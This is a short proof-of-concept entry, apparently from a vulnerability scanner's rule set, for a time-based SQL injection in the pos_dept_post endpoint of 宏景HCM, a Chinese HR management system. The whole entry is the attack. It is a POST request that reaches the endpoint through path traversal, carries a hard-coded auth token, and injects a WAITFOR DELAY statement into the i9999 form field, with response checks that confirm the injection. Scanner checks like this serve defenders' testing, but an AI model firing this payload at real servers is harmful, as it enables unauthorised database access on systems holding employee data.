{
        'name': '宏景HCM-pos_dept_post-delay-sql注入漏洞',
        'poc':[{'requests':{
            'method': 'post',
            'payload': '/templates/attestation/../../pos/roleinfo/pos_dept_post',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
                'x-auth-token': 'd9eaeacd5de1008fd43f737c853dcbcb',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            },
            'data': '''usertable=h00&i9999=1';WAITFOR DELAY '0:0:5'--+''',
            'dnslog': False,
            'sqltime': True,
        },
        'response': {
            'status_code': 200,
            'text': '<?xml'
        }}]
    }